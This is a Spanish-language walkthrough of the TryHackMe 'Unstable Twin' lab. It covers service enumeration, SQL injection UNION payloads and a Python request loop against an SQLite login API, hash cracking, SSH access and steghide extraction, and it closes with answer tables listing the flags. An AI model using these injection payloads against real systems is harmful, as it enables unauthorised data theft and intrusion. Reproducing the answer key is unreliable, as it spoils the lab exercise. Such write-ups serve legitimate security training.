# Unstable Twin

| Dificultad | Tipo | Slug | Link | Sección | Fuente | Componentes | Impacto |
|-----------|------|------|------|--------|--------|-------------|---------|
| Medium | CTF / Web API (SQLi) + Stego | unstabletwin | https://tryhackme.com/room/unstabletwin | 02 Level Medium | TryHackMe | nginx, API /info, SQLi (SQLite), hash cracking, SSH, steghide, Base62 | Compromiso total del host (user + root/final flag) |

---

**Contexto:** La sala **Unstable Twin** está basada en la película *Twins* ("Julius y Vincent han entrado en el mercado de SERVICES; Vincent ha liado el despliegue"). Un único nginx en el puerto 80 alterna dos builds (la estable de Julius y la inestable de Vincent). La API `/info` revela el endpoint `/api/login`, vulnerable a **SQL Injection** sobre SQLite: con una cadenas `UNION` se vuelcan usuarios, la tabla `notes` y el hash SHA512 de la contraseña de Mary Ann, que se rompe (`experiment`). Por SSH se lee la flag del usuario y una nota con pistas de esteganografía; mediante `/get_image` se descargan las fotos de cada usuario y se extrae con **steghide** una pieza de clave por imagen. Ordenando las piezas por el arcoíris (Red-Orange-Yellow-Green) y descodificando en **Base62** se obtiene la flag final.

## Solucionario

### Task 1: Exploit the Twin Servers / Explotar los servidores Twin
**Explicación:**

Se añade `twin.thm` a `/etc/hosts` y se enumera con `nmap` (puertos 22 SSH y 80 nginx 1.14.1) y `gobuster`/`ffuf`, que encuentran `/info`. Realizando peticiones repetidas a `/info` se observa que responden **dos builds** diferentes (estable `1.3.4-dev` de Julius e inestable de Vincent), por lo que no es la única build (`Nay`).

```bash
nmap -sC -sV <IP>
gobuster dir -u http://twin.thm -w /usr/share/wordlists/dirb/common.txt -x php
curl -I http://twin.thm/info
# Repitiendo la petición cambian las cabeceras/build: 1.3.4-dev ↔ unstable
```

El mensaje de `/info` guía al endpoint `/api/login`. Probando una comilla `'` en los parámetros se produce un error de aplicación (SQLi). Se confirma SQLite (`sqlite_version()`) y se extrae todo con payloads `UNION SELECT`:

```sql
1' UNION SELECT username, password FROM users ORDER BY id -- -
1' UNION SELECT 1, group_concat(password) FROM users ORDER BY id -- -
1' UNION SELECT 1, tbl_name FROM sqlite_master -- -
1' UNION SELECT null, sql FROM sqlite_master WHERE type!='meta' AND sql IS NOT NULL AND name='users' -- -
1' UNION SELECT null, sql FROM sqlite_master WHERE type!='meta' AND sql IS NOT NULL AND name='notes' -- -
' UNION SELECT 1, notes FROM notes -- -
```

```python
import requests
url = 'http://twin.thm/api/login'
for q in [...]:
    x = requests.post(url, data={'username': q, 'password': '123456'})
    print(q, x.text)
```

Del volcado: hay **5 usuarios** (Red, Orange, Yellow, Green, ...), el color de Vincent es **Orange**, y el hash SHA512 de Mary Ann se rompe con `john --format=Raw-SHA512` devolviendo **`experiment`** como contraseña SSH.

```bash
ssh mary_ann@<IP>
# password: experiment
cat /home/mary_ann/user.txt
# THM{Mary_Ann_notes}
```

En el home también está `server_notes.txt`, que menciona el endpoint `/get_image?name=<usuario>` (y las fotos). Se descargan las imágenes de cada usuario y se extraen los mensajes ocultos con `steghide` (sin passphrase). Cada pieza va precedida de un color; según la nota "arréglalo como un arcoíris", se ordenan **Red → Orange → Yellow → Green** y el resultado concatenado se descodifica en **Base62** con CyberChef para obtener la flag final.

```bash
for u in red orange yellow green; do
  curl http://twin.thm/get_image?name=$u --output $u.jpg
  steghide extract -sf $u.jpg   # sin passphrase
done

# Concatenación en orden arcoíris:
# 1DVsdb2uEE0k5HK4GAIZ + PS0Mby2jomUKLjvQ4OSw + jKLNAAeCdl2J8BCRuXVX + eVYvs6J6HKpZWPG8pfeHoNG1
# CyberChef: From Base62 → THM{The_Family_Is_Back_Together}
```

| Pregunta | Respuesta |
|----------|-----------|
| What is the build number of the server? | `1.3.4-dev` |
| Is this the only build? (Yay/Nay) | `Nay` |
| How many users are there? | `5` |
| What colour is Vincent? | `Orange` |
| What is Mary Ann's SSH password? | `experiment` |
| What is the user flag? | `THM{Mary_Ann_notes}` |
| What is the final flag? | `THM{The_Family_Is_Back_Together}` |

### Tabla de preguntas y respuestas

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What is the build number of the server? | `1.3.4-dev` |
| 1 | Is this the only build? (Yay/Nay) | `Nay` |
| 1 | How many users are there? | `5` |
| 1 | What colour is Vincent? | `Orange` |
| 1 | What is Mary Ann's SSH password? | `experiment` |
| 1 | What is the user flag? | `THM{Mary_Ann_notes}` |
| 1 | What is the final flag? | `THM{The_Family_Is_Back_Together}` |

---

**Metodología:** Fuzzing de directorios y de la API, detección de dos builds balanceadas en nginx, inyección SQL UNION sobre SQLite para volcar esquema y datos, cracking del hash de contraseña, acceso SSH, explotación de esteganografía con `steghide` y descodificación Base62 final.

### Cadena de ataque / Attack Chain

```
/etc/hosts twin.thm → nmap → gobuster/ffuf /info → dos builds (1.3.4-dev / unstable) → /api/login SQLi UNION (users, sqlite_master, notes) → 5 usuarios / Orange / hash SHA512 → john → experiment → SSH mary_ann → user.txt → server_notes.txt → /get_image → steghide → piezas Red-Orange-Yellow-Green → concatenar → Base62 decode → flag final
```

**Learning chain:** Enumeración web y API → análisis de balanceo/fingerprinting → inyección SQL manual → extracción de esquema → cracking de hashes → acceso remoto → esteganografía → descodificación de cadenas.

**Lección:** *Una API con SQLi permite reconstruir el esquema completo con `sqlite_master`, y las claves ocultas en imágenes mediante técnicas estego exigen ordenar los fragmentos según la pista del escenario (arcoíris) antes de descodificar.*

**MITRE ATT&CK:** T1190 Exploit Public-Facing Application · T1083 File and Directory Discovery · T1110.002 Password Cracking · T1027.001 Obfuscated Files or Information (Steganography).

**Fuente:** [TryHackMe - Unstable Twin](https://tryhackme.com/room/unstabletwin)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.